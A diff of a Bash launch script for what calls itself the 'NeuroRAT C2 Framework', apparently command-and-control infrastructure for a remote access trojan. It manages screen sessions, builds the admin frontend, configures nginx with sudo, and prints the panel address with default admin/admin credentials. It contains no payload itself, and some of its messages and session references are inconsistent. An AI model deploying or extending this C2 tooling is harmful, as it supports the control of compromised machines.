@@ -6,11 +6,13 @@
 # Определение цветов для вывода
 RED='\033[0;31m'
 GREEN='\033[0;32m'
-YELLOW='\033[0;33m'
+YELLOW='\033[1;33m'
 BLUE='\033[0;34m'
+PURPLE='\033[0;35m'
+CYAN='\033[0;36m'
 NC='\033[0m' # No Color
 
-echo -e "${BLUE}====== Запуск NeuroRAT C2 Framework ======${NC}"
+echo -e "${PURPLE}====== Запуск NeuroRAT C2 Framework ======${NC}"
 
 # Переходим в корневую директорию проекта
 cd "$(dirname "$0")"
@@ -18,101 +20,97 @@ cd "$(dirname "$0")"
 # Создаем необходимые директории, если их нет
 mkdir -p logs
 
-# Проверка, запущен ли уже сервер
-if pgrep -f "python3 server.py" > /dev/null; then
+# Проверка, работает ли уже сервер
+if screen -list | grep -q "neurorat-server"; then
     echo -e "${YELLOW}Сервер уже запущен. Останавливаем...${NC}"
-    pkill -f "python3 server.py"
+    screen -S neurorat-server -X quit
     sleep 2
 fi
 
-# Проверка наличия виртуального окружения
+# Активация виртуального окружения
 if [ -d "venv" ]; then
-    echo -e "${GREEN}Активация виртуального окружения...${NC}"
+    echo -e "${GREEN}Виртуальное окружение активировано${NC}"
     source venv/bin/activate
 else
-    echo -e "${RED}Виртуальное окружение не найдено. Запустите сначала ./deploy.sh${NC}"
-    exit 1
+    echo -e "${YELLOW}Виртуальное окружение не найдено. Создание...${NC}"
+    python3 -m venv venv
+    source venv/bin/activate
+    pip install -r requirements.txt
+    echo -e "${GREEN}Виртуальное окружение создано и активировано${NC}"
 fi
 
-# Проверка наличия файла .env
-if [ ! -f ".env" ]; then
-    echo -e "${YELLOW}Файл .env не найден. Создаем с базовыми настройками...${NC}"
-    cat > .env << EOL
-SERVER_HOST=0.0.0.0
-SERVER_PORT=8080
-DEBUG=True
-DATABASE_URL=sqlite:///neurorat.db
-ADMIN_USERNAME=admin
-ADMIN_PASSWORD=admin
-EOL
-fi
-
-# Загрузка .env файла
-echo -e "${GREEN}Загрузка конфигурации из .env...${NC}"
-source .env
-
-# Проверка наличия сервера
-if [ ! -f "server.py" ]; then
-    echo -e "${RED}Файл server.py не найден. Запустите сначала ./deploy.sh${NC}"
-    exit 1
-fi
-
-# Проверка компиляции фронтенда
-if [ ! -d "admin-panel-new/dist" ]; then
-    echo -e "${YELLOW}Фронтенд не скомпилирован. Компилируем...${NC}"
-    # Проверка наличия Node.js
-    if ! command -v node &> /dev/null; then
-        echo -e "${RED}Node.js не найден. Невозможно скомпилировать фронтенд.${NC}"
-        echo -e "${YELLOW}Продолжаем без компиляции фронтенда.${NC}"
-    else
-        cd admin-panel-new
-        npm install
-        npm run build
-        cd ..
-    fi
-fi
-
-# Запуск мониторинга логов в отдельном экране
-if command -v screen &> /dev/null; then
-    # Если screen установлен, запускаем отдельные сессии для сервера и логов
-    echo -e "${GREEN}Запуск сервера в screen...${NC}"
-    
-    # Завершаем существующие сессии, если они есть
-    screen -ls | grep "neurorat" | cut -d. -f1 | awk '{print $1}' | xargs -I{} screen -S {} -X quit > /dev/null 2>&1
-    
-    # Запускаем сервер в отдельной screen-сессии
-    screen -dmS neurorat-server bash -c "source venv/bin/activate && python3 server.py; exec bash"
-    
-    # Запускаем монитор логов в отдельной screen-сессии
-    screen -dmS neurorat-logs bash -c "tail -f logs/server.log; exec bash"
-    
-    echo -e "${YELLOW}Сервер запущен в screen-сессии 'neurorat-server'${NC}"
-    echo -e "${YELLOW}Для подключения к серверу: ${GREEN}screen -r neurorat-server${NC}"
-    echo -e "${YELLOW}Для просмотра логов: ${GREEN}screen -r neurorat-logs${NC}"
+# Проверка наличия .env файла
+if [ -f ".env" ]; then
+    echo -e "${GREEN}Найден .env файл, загружаем настройки...${NC}"
+    export $(grep -v '^#' .env | xargs)
 else
-    # Если screen не установлен, запускаем сервер в фоновом режиме
-    echo -e "${YELLOW}Запуск сервера в фоновом режиме...${NC}"
-    mkdir -p logs
-    nohup python3 server.py > logs/nohup.out 2>&1 &
-    
-    SERVER_PID=$!
-    echo -e "${GREEN}Сервер запущен в фоновом режиме. PID: ${SERVER_PID}${NC}"
-    echo -e "${YELLOW}Для просмотра логов: ${GREEN}tail -f logs/server.log${NC}"
+    echo -e "${YELLOW}Файл .env не найден. Используем стандартные настройки.${NC}"
 fi
 
-# Вывод информации о доступе
-echo -e "${BLUE}Информация о доступе к C2 Framework:${NC}"
-echo -e "${BLUE}=====================================${NC}"
-echo -e "${YELLOW}Панель администратора доступна по адресу:${NC}"
-echo -e "${GREEN}http://$(hostname -I 2>/dev/null | awk '{print $1}' || echo "localhost"):${SERVER_PORT:-8080}${NC}"
-echo -e "${YELLOW}Логин: ${GREEN}${ADMIN_USERNAME:-admin}${NC}"
-echo -e "${YELLOW}Пароль: ${GREEN}${ADMIN_PASSWORD:-admin}${NC}"
-echo -e "${BLUE}=====================================${NC}"
+# Компиляция фронтенда
+echo -e "${BLUE}Компиляция панели администратора...${NC}"
 
-# Дополнительные инструкции для разработки
-echo -e "${BLUE}Дополнительные команды:${NC}"
-echo -e "${YELLOW}Запуск фронтенда в режиме разработки: ${GREEN}cd admin-panel-new && npm run dev${NC}"
-echo -e "${YELLOW}Просмотр логов сервера: ${GREEN}tail -f logs/server.log${NC}"
+if [ ! -d "neurorat-ui/dist" ]; then
+    echo -e "${YELLOW}Установка зависимостей...${NC}"
+    cd neurorat-ui
+    npm install
+    echo -e "${GREEN}Сборка фронтенда...${NC}"
+    npm run build
+    cd ..
+    echo -e "${GREEN}Фронтенд успешно собран!${NC}"
+else
+    echo -e "${GREEN}Фронтенд уже собран.${NC}"
+fi
 
-echo -e "${BLUE}====== NeuroRAT C2 Framework запущен ======${NC}"
+# Настройка nginx (если установлен)
+if command -v nginx &> /dev/null; then
+    echo -e "${BLUE}Настройка Nginx...${NC}"
+    sudo cp nginx/neurorat /etc/nginx/sites-available/
+    sudo ln -sf /etc/nginx/sites-available/neurorat /etc/nginx/sites-enabled/
+    
+    echo -e "${BLUE}Проверка конфигурации Nginx...${NC}"
+    if sudo nginx -t; then
+        sudo systemctl restart nginx
+        echo -e "${GREEN}Nginx настроен и перезапущен!${NC}"
+    else
+        echo -e "${RED}Ошибка в конфигурации Nginx!${NC}"
+    fi
+else
+    echo -e "${YELLOW}Nginx не установлен или не найден. Пропускаем настройку.${NC}"
+fi
+
+# Запуск сервера в screen
+echo -e "${GREEN}Сервер запущен. Остановливаем...${NC}"
+
+if screen -list | grep -q "neurorat-server"; then
+    screen -S neurorat-server -X quit
+    sleep 2
+fi
+
+echo -e "${YELLOW}Активация виртуального окружения...${NC}"
+source venv/bin/activate 2>/dev/null || echo -e "${YELLOW}Виртуальное окружение не найдено, используем системный Python${NC}"
+
+echo -e "${YELLOW}Загрузка конфигурации из .env...${NC}"
+if [ -f ".env" ]; then
+    export $(grep -v '^#' .env | xargs) 2>/dev/null
+fi
+
+echo -e "${YELLOW}Запуск сервера в screen...${NC}"
+screen -dmS neurorat-server python server.py
+echo -e "${GREEN}Сервер запущен в screen-сессии 'neurorat-server'${NC}"
+echo -e "${CYAN}Для подключения к серверу: ${GREEN}screen -r neurorat-server${NC}"
+echo -e "${CYAN}Для просмотра логов: ${GREEN}screen -r neurorat-logs${NC}"
+
+echo -e "${GREEN}Информация о доступе к C2 Framework:${NC}"
+echo -e "========================================"
+echo -e "${CYAN}Панель администратора доступна по адресу:${NC}"
+echo -e "${GREEN}http://$(hostname -I | awk '{print $1}'):8080${NC}"
+echo -e "${CYAN}Логин: ${GREEN}admin${NC}"
+echo -e "${CYAN}Пароль: ${GREEN}admin${NC} (по умолчанию) или установленный вами"
+echo -e "========================================"
+
+echo -e "${YELLOW}Дополнительные команды:${NC}"
+echo -e "${CYAN}Запуск фронтенда в режиме разработки: ${GREEN}cd neurorat-ui && npm run dev${NC}"
+echo -e "${CYAN}Просмотр логов сервера: ${GREEN}tail -f logs/server.log${NC}"
+echo -e "${PURPLE}====== NeuroRAT C2 Framework запущен ======${NC}"
 exit 0 
